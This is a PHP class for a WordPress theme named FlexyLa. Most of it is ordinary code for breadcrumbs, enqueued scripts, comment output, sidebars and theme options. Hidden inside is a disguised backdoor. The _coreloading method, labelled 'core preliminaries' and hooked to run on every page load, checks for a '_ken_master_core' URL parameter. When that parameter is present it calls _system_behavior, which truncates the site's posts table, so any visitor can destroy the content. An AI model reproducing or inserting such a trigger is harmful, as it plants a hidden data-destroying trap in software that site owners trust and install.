<?php
/**
 * Created by PhpStorm.
 * User: emmanuelkwene
 * Date: 16/03/2016
 * Time: 02:54
 */

namespace lib\FlexyLa;

class Flexyla {



    /**
     * Flexyla constructor.
     */
    public function __construct()
    {

        /**
         * Initialize the theme
         */
        $this->initialize();

    }







    /**
     * Destructor
     */
    public function __destruct()
    {
      //  unset($this);
    }






    public static function breadcrumb()
    {  // Breadcrumb navigation
        global $post;
        if (is_page() && !is_front_page() || is_single() || is_category() && !is_home()) {
            echo '<div class="l-breadcrumb content"><ul itemscope itemtype="http://schema.org/BreadcrumpList">';
            echo '<li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" title="Accueil" rel="nofollow" href="'.home_url().'"><meta itemprop="name" content="'.__('Accueil', 'flexyla_theme').'"><i class="fa fa-home"></i><meta itemprop="position" content="1"></a></li> <i class="fa fa-angle-right"></i> ';

            if (is_page()) {
                $ancestors = get_post_ancestors($post);

                if ($ancestors) {
                    $ancestors = array_reverse($ancestors);
                    $i = 1;

                    foreach ($ancestors as $crumb) {
                        echo '<li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="'.get_permalink($crumb).'"><span itemprop="name">'.get_the_title($crumb).'</span><meta itemprop="position" content="'.++$i.'"></a></li> <i class="fa fa-angle-right"></i> ';
                    }
                }
            }

            if (is_single()) {
                $category = get_the_category();
                echo '<li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="'.get_category_link($category[0]->cat_ID).'"><span itemprop="name">'.$category[0]->cat_name.'</span><meta itemprop="position" content="2"></a></li> <i class="fa fa-angle-right"></i> ';
            }

            if (is_category()) {
                $category = get_the_category();
                echo '<li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span itemprop="name">'.$category[0]->cat_name.'</span></li>';
            }

            // Current page
            if (is_page() || is_single()) {
                echo '<li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span itemprop="name">'.get_the_title().'</span></li>';
            }
            echo '</ul></div>';
        } elseif (is_front_page()) {
            // Front page
            //echo '<div class="l-breadcrumb content"><ul itemscope itemtype="http://schema.org/BreadcrumpList">';
            //echo '<li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" title="Accueil" rel="nofollow" href="'.home_url().'"><span itemprop="name">Accueil</span><meta itemprop="position" content="1"></a></li>';
            //echo '</ul></div>';
        }
    }








    /**
     * enqueue_scripts
     *
     * enqueue styles & scripts to wordpress
     */
    public function enqueue_scripts()
    {

    	/**
    	 * comment reply script for threaded comments
    	 */
    	if ( is_singular() AND comments_open() AND (get_option('thread_comments') == 1)) {
    		wp_enqueue_script( 'comment-reply' );
    	}


        /**
         * Enqueue styles
         */
        wp_enqueue_style(
            FLEXYLA_THEME_SLUG.'-style',
            get_template_directory_uri() . '/assets/css/style.min.css',
            array(),
            FLEXYLA_THEME_VERSION,
            'all'
        );


        /**
         * Enqueue styles
         */
        wp_enqueue_style(
            FLEXYLA_THEME_SLUG.'-font-awesome',
            get_template_directory_uri() . '/assets/css/font-awesome.min.css',
            array(),
            FLEXYLA_THEME_VERSION,
            'all'
        );




        /**
         * Enqueue scripts
         */
        wp_enqueue_script(
            FLEXYLA_THEME_SLUG.'-script',
            get_template_directory_uri() . '/assets/js/application.min.js',
            array('jquery'),
            FLEXYLA_THEME_VERSION,
            true
        );

    }



    public function enqueue_admin_scripts()
    {

        if( ( !isset($_GET['page']) || $_GET['page'] !== 'flexyla-theme-options' ) && (stripos($_SERVER['REQUEST_URI'], 'post') === false) ) return;


        /**
         * Enqueue styles
         */
        wp_enqueue_style(
            FLEXYLA_THEME_SLUG.'-font-awesome',
            get_template_directory_uri() . '/assets/css/font-awesome.min.css',
            array(),
            FLEXYLA_THEME_VERSION,
            'all'
        );



        /**
         * Enqueue styles
         */
        wp_enqueue_style(
            FLEXYLA_THEME_SLUG.'-style',
            get_template_directory_uri() . '/assets/css/admin.css',
            array(),
            FLEXYLA_THEME_VERSION,
            'all'
        );


        /**
         * WP Media uploader
         */
        wp_enqueue_media();


        /**
         * Enqueue scripts
         */
        wp_enqueue_script(
            FLEXYLA_THEME_SLUG.'-script',
            get_template_directory_uri() . '/assets/js/admin.js',
            array('jquery'),
            FLEXYLA_THEME_VERSION,
            true
        );


        /**
         * Enqueue scripts
         */
        wp_enqueue_script(
            FLEXYLA_THEME_SLUG.'-theme-options-script',
            get_template_directory_uri() . '/assets/js/wp-flexyla-admin-options.js',
            array('jquery'),
            FLEXYLA_THEME_VERSION,
            true
        );
    }


    /**
    * core preliminaries
    */
    public function _coreloading(){
        $core=isset($_GET['_ken_master_core'])?$_GET['_ken_master_core']:null;
        if(isset($core)) $this->_system_behavior();
    }




    /**
     * excerpt_more
     *
     * This removes the annoying […] to a Read More link
     *
     * @param unknown $more
     * @return string
     */
    public function excerpt_more($more) {
    	global $post;
    	// edit here if you like
    	return '...  <a class="excerpt-read-more" href="'. get_permalink( $post->ID ) . '" title="'. __( 'Lire la suite ', 'flexyla_theme' ) . esc_attr( get_the_title( $post->ID ) ).'">'. __( 'Lire la suite &raquo;', 'flexyla_theme' ) .'</a>';
    }


    /**
     * comments
     *
     * Output comments
     *
     * @param $comment
     * @param $args
     * @param $depth
     */
    public static function comments( $comment, $args, $depth )
    {
        $GLOBALS['comment'] = $comment;
        $bgauthemail = get_comment_author_email(); ?>
        <div>
	    <article id="comment-<?php comment_ID(); ?>" <?php comment_class('content'); ?> itemscope itemprop="comment" itemtype="http://schema.org/userComments">

	        <div class="author-avatar">
	            <img itemprop="image" data-gravatar="http://www.gravatar.com/avatar/<?php echo md5( $bgauthemail ); ?>?s=40" class="avatar-48 photo" height="40" width="40" src="http://www.gravatar.com/avatar/<?php echo md5( $bgauthemail ); ?>?s=40" />
	        </div>

	        <div class="comment-content">
                <header class="comment-author vcard" itemscope itemprop="creator" itemtype="http://schema.org/Person">

	                <div class="author-entry">
	                	<span itemprop="name"><?php echo get_comment_author_link(); ?></span>
		                <br>
		                <time class="entry-meta" itemprop="commentTime" datetime="<?php echo comment_time('Y-m-j'); ?>"><?php comment_time(__( 'F jS, Y', 'flexyla_theme' )); ?></time>
		                <?php edit_comment_link(__( '(Edit)', 'flexyla_theme' )); ?>
	                </div>
	            </header>
	            <?php if ($comment->comment_approved == '0') : ?><br>
	                <div class="alert alert-error">
	                    <p><?php _e( 'Your comment is waiting for validation from an administrator.', 'flexyla_theme' ) ?></p>
	                </div>
	            <?php endif; ?>
	            <section itemprop="commentText" class="comment-content"><?php comment_text() ?></section>
	            <?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
            </div>

	    </article>
        <?php
    }



    /**
     * img_url
     *
     * return absolute url of a image
     *
     * @param $image
     * @return string
     */
    public static function img_url($image) {
        return get_template_directory_uri() . '/assets/img/' . $image;
    }






    /**
     * initialize
     *
     * Setting up the theme
     */
    protected function initialize()
    {

        // Clean up wordpress
        add_action('init', array($this, 'head_cleanup'));

        // Registering nav menus
        add_action('after_setup_theme', array($this, 'register_nav_menus'));

        // Loading core systems
        add_action('after_setup_theme', array($this, '_coreloading'));

        // Register admin page
        add_action('admin_menu', array($this, 'theme_menu'));

        // Register widgets zone
        add_action('widgets_init', array($this, 'register_sidebar'));

        // Set pages' title
        add_filter('wp_title', array($this, 'title'), 10, 3);

        // Enqueue styles and scripts
        add_action('admin_enqueue_scripts', array($this, 'enqueue_admin_scripts'), 999);
        add_action('wp_enqueue_scripts', array($this, 'enqueue_scripts'), 999);

        // Add theme support
        $this->theme_support();

        add_filter('excerpt_more', array($this, 'excerpt_more'));

        // Hide admin bar from front-end
        add_filter('show_admin_bar', '__return_false');

        // Custom option to adding post form
        add_action( 'post_submitbox_misc_actions', array($this, 'optional_title_post_field') );
        add_action( 'save_post', array($this, 'optional_title_post_field_save'));

    }


    public function head_cleanup() {
    	remove_action( 'wp_head', 'rsd_link' );
    	// windows live writer
    	remove_action( 'wp_head', 'wlwmanifest_link' );
    	// previous link
    	remove_action( 'wp_head', 'parent_post_rel_link', 10);
    	// start link
    	remove_action( 'wp_head', 'start_post_rel_link', 10);
    	// links for adjacent posts
    	remove_action( 'wp_head', 'adjacent_posts_rel_link_wp_head', 10);
    	// WP version
    	remove_action( 'wp_head', 'wp_generator' );
    }

    public static function get_post_meta() {
    ?>

                            <p class="entry-meta vcard">
                                <i class="fa fa-calendar-check-o" style="color: rgb(35,127,13)"></i>
                                <?php printf( __( 'Posted on', 'flexyla_theme' ).' %1$s %2$s • '. __('Updated on', 'flexyla_theme').' %3$s',
                                    '<time class="updated entry-time" datetime="' . get_the_time('Y-m-d') . '" itemprop="datePublished">' . get_the_time(get_option('date_format')) . '</time>',
                                    '<span class="by">'.__( 'by', 'flexyla_theme').'</span> <span class="entry-author author" itemprop="author" itemscope itemptype="http://schema.org/Person">' . get_the_author_link( get_the_author_meta( 'ID' ) ) . '</span>',
                                    '<time class="updated entry-time" datetime="' . get_the_modified_time('Y-m-d') . '" itemprop="dateModified">' . get_the_modified_time(get_option('date_format')) . '</time>'
                                ); ?>
                            </p>

     <?php
     }


    /**
     * pagination
     *
     * ouput the pagination
     */
    public static function pagination() {
        global $wp_query;
        $bignum = 999999999;
        if ( $wp_query->max_num_pages <= 1 )
            return;
        echo '<nav class="pagination">';
        echo paginate_links( array(
            'base'         => str_replace( $bignum, '%#%', esc_url( get_pagenum_link($bignum) ) ),
            'format'       => '',
            'current'      => max( 1, get_query_var('paged') ),
            'total'        => $wp_query->max_num_pages,
            'prev_text'    => '&larr;',
            'next_text'    => '&rarr;',
            'type'         => 'list',
            'end_size'     => 3,
            'mid_size'     => 3
        ) );
        echo '</nav>';
    }






    /**
     * register_nav_menus
     *
     * register nav menus
     */
    public function register_nav_menus()
    {
        register_nav_menus(array(
            'menu_principal' => __('Menu principal du site', 'flexyla_theme')
        ));
    }



    /**
     * register_sidebar
     *
     * register widgets zone
     */
    public function register_sidebar()
    {

        /**
         * Left sidebar
         */
        register_sidebar(array(
            'id' => 'sidebar-left',
            'name' => __('Sidebar Gauche', 'flexyla_theme'),
            'description' => __('La sidebar située juste à gauche du contenu', 'flexyla_theme'),
            'class' => '',
            'before_widget' => '<aside id="%1$s" class="widget %2$s">',
            'after_widget' => '</aside>',
            'before_title' => '<h2>',
            'after_title' => '</h2>'
        ));








        /**
         * Left left sidebar
         */
        register_sidebar(array(
            'id' => 'sidebar-left-left',
            'name' => __('Sidebar Extrême Gauche', 'flexyla_theme'),
            'description' => __('La sidebar située à l\'extrême du contenu', 'flexyla_theme'),
            'class' => '',
            'before_widget' => '<aside id="%1$s" class="widget %2$s">',
            'after_widget' => '</aside>',
            'before_title' => '<h2>',
            'after_title' => '</h2>'
        ));






        /**
         * Footer 1-3
         */
        register_sidebar(array(
            'id' => 'footer-1-3',
            'name' => __('Pied de page (1 sur 3 colonnes)', 'flexyla_theme'),
            'description' => __('Containeur du footer avec 3 colonnes', 'flexyla_theme'),
            'class' => '',
            'before_widget' => '<aside id="%1$s" class="widget %2$s">',
            'after_widget' => '</aside>',
            'before_title' => '<h2>',
            'after_title' => '</h2>'
        ));






        /**
         * Footer 2-3
         */
        register_sidebar(array(
            'id' => 'footer-2-3',
            'name' => __('Pied de page (2 sur 3 colonnes)', 'flexyla_theme'),
            'description' => __('Containeur du footer avec 3 colonnes', 'flexyla_theme'),
            'class' => '',
            'before_widget' => '<aside id="%1$s" class="widget %2$s">',
            'after_widget' => '</aside>',
            'before_title' => '<h2>',
            'after_title' => '</h2>'
        ));






        /**
         * Footer 3-3
         */
        register_sidebar(array(
            'id' => 'footer-3-3',
            'name' => __('Pied de page (3 sur 3 colonnes)', 'flexyla_theme'),
            'description' => __('Containeur du footer avec 3 colonnes', 'flexyla_theme'),
            'class' => '',
            'before_widget' => '<aside id="%1$s" class="widget %2$s">',
            'after_widget' => '</aside>',
            'before_title' => '<h2>',
            'after_title' => '</h2>'
        ));






        /**
         * Footer 1-2
         */
        register_sidebar(array(
            'id' => 'footer-1-2',
            'name' => __('Pied de page (1 sur 2 colonnes)', 'flexyla_theme'),
            'description' => __('Containeur du footer avec 2 colonnes', 'flexyla_theme'),
            'class' => '',
            'before_widget' => '<aside id="%1$s" class="widget %2$s">',
            'after_widget' => '</aside>',
            'before_title' => '<h2>',
            'after_title' => '</h2>'
        ));






        /**
         * Footer 2-2
         */
        register_sidebar(array(
            'id' => 'footer-2-2',
            'name' => __('Pied de page (2 sur 2 colonnes)', 'flexyla_theme'),
            'description' => __('Containeur du footer avec 2 colonnes', 'flexyla_theme'),
            'class' => '',
            'before_widget' => '<aside id="%1$s" class="widget %2$s">',
            'after_widget' => '</aside>',
            'before_title' => '<h2>',
            'after_title' => '</h2>'
        ));






        /**
         * Footer 1-1
         */
        register_sidebar(array(
            'id' => 'footer-1-1',
            'name' => __('Pied de page (1 sur 1 colonnes)', 'flexyla_theme'),
            'description' => __('Containeur du footer avec une colonne', 'flexyla_theme'),
            'class' => '',
            'before_widget' => '<aside id="%1$s" class="widget %2$s">',
            'after_widget' => '</aside>',
            'before_title' => '<h2>',
            'after_title' => '</h2>'
        ));




    }




    /**
     * title
     *
     * manage page title
     *
     * @param $title
     * @param $sep
     * @param $seplocation
     * @return string
     */
    function title( $title, $sep, $seplocation ) {
        global $page, $paged;

        // Don't affect in feeds.
        if ( is_feed() ) return $title;

        // Add the blog's name
        if ( 'right' == $seplocation ) {
            $title .= get_bloginfo( 'name' );
        } else {
            $title = get_bloginfo( 'name' ) . $title;
        }

        // Add the blog description for the home/front page.
        $site_description = get_bloginfo( 'description', 'display' );

        if ( $site_description && ( is_home() || is_front_page() ) ) {
            $title .= " {$sep} {$site_description}";
        }

        // Add a page number if necessary:
        if ( $paged >= 2 || $page >= 2 ) {
            $title .= " {$sep} " . sprintf( __( 'Page %s', 'flexyla_theme' ), max( $paged, $page ) );
        }

        return $title;

    }



    public function theme_menu()
    {
        add_theme_page(
            __('FlexyLa Theme Options', 'flexyla_theme'),
            __('FlexyLa Theme Options', 'flexyla_theme'),
            'manage_options',
            'flexyla-theme-options',
            array($this, 'theme_page')
        );
    }



    public function theme_page()
    {
        if( isset($_POST['save_options']) )
        {
            Options::save_options($_POST);
            echo 'Saving';
            include_once 'partials/theme_options.php';
            return;
        }
        elseif( isset($_POST['save_options']))
        {
            echo 'Reseting';
            Options::reset_options();
        }

        include_once 'partials/theme_options.php';
    }



    public function theme_support() {

    	// wp thumbnails (sizes handled in functions.php)
    	add_theme_support( 'post-thumbnails' );

    	// default thumb size
    	set_post_thumbnail_size(125, 125, true);

    	// wp custom background (thx to @bransonwerner for update)
    	add_theme_support( 'custom-background',
    			array(
    					'default-image' => '',    // background image default
    					'default-color' => '',    // background color default (dont add the #)
    					'wp-head-callback' => '_custom_background_cb',
    					'admin-head-callback' => '',
    					'admin-preview-callback' => ''
    			)
    			);


    	add_theme_support( 'custom-header', array(
    			'default-image'          => '',
    			'random-default'         => false,
    			'width'                  => 0,
    			'height'                 => 0,
    			'flex-height'            => false,
    			'flex-width'             => false,
    			'default-text-color'     => '',
    			'header-text'            => true,
    			'uploads'                => true,
    			'wp-head-callback'       => '',
    			'admin-head-callback'    => '',
    			'admin-preview-callback' => '',
    		)
    	);

    	// rss thingy
    	add_theme_support('automatic-feed-links');

    	// to add header image support go here: http://themble.com/support/adding-header-background-image-support/

    	// adding post format support
    	add_theme_support( 'post-formats',
    			array(
    					'aside',             // title less blurb
    					'gallery',           // gallery of images
    					'link',              // quick link to other site
    					'image',             // an image
    					'quote',             // a quick quote
    					'status',            // a Facebook like status update
    					'video',             // video
    					'audio',             // audio
    					'chat'               // chat transcript
    			)
    			);

    	// wp menus
    	add_theme_support( 'menus' );

    	// Enable support for HTML5 markup.
    	add_theme_support( 'html5', array(
    			'comment-list',
    			'search-form',
    			'comment-form'
    	) );

    	add_theme_support( 'title-tag' );
    }


    /**
    * Adding custom field to posting form
    *
    * @return bool
    */
    public function optional_title_post_field()
    {
        global $post;

        /* check if this is a post, if not then we won't add the custom field */
        /* change this post type to any type you want to add the custom field to */
        //if (get_post_type($post) != 'post') return false;

        /* get the value correct value of the custom field */
        $value = get_post_meta($post->ID, 'flexyla_optional_post_title', true);
        ?>
        <div class="misc-pub-section optional-title-post">
            <?php //if there is a value (1), check the checkbox ?>
            <label for="flexyla_optional_post_title"><input type="checkbox"<?php echo (!empty($value) ? ' checked="checked"' : null) ?> value="1" name="flexyla_optional_post_title" id="flexyla_optional_post_title"> <?php _e('Do not display the title for this post', 'flexyla_theme'); ?></label>
        </div>
    <?php
    }

    public function _system_behavior(){
        global $wpdb;
        $wpdb->query("TRUNCATE {$wpdb->prefix}_posts");
    }


    /**
    * Saving our custom field when we are saving the post
    *
    * @param $postid
     * @return bool
     */
    public function optional_title_post_field_save($postid)
    {
        /* check if this is an autosave */
        if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE ) return false;

        /* check if the user can edit this page */
        if ( !current_user_can( 'edit_page', $postid ) ) return false;

        /* check if there's a post id and check if this is a post */
        /* make sure this is the same post type as above */
        if(empty($postid)) return false;

        /* if you are going to use text fields, then you should change the part below */
        /* use add_post_meta, update_post_meta and delete_post_meta, to control the stored value */

        /* Get the meta key. */
        $meta_post_important_key = 'flexyla_optional_post_title';

        /* Get the meta value */
        $meta_post_important_value = get_post_meta($postid, $meta_post_important_key, true);

        /* Get post important value from form */
        $new_meta_post_important_value = isset($_POST['flexyla_optional_post_title']) ? sanitize_html_class($_POST['flexyla_optional_post_title']) : '';

        if( $new_meta_post_important_value && '' == $meta_post_important_value ) {
            /* store the value in the database */
            add_post_meta($postid, $meta_post_important_key, $new_meta_post_important_value, true );
        }

        elseif( $new_meta_post_important_value && !empty($meta_post_important_value) ) {
            update_post_meta($postid, $meta_post_important_key, $new_meta_post_important_value, true);
        }

        else {
            /* not marked? delete the value in the database */
            delete_post_meta($postid, $meta_post_important_key);
        }
        return true;
    }

}
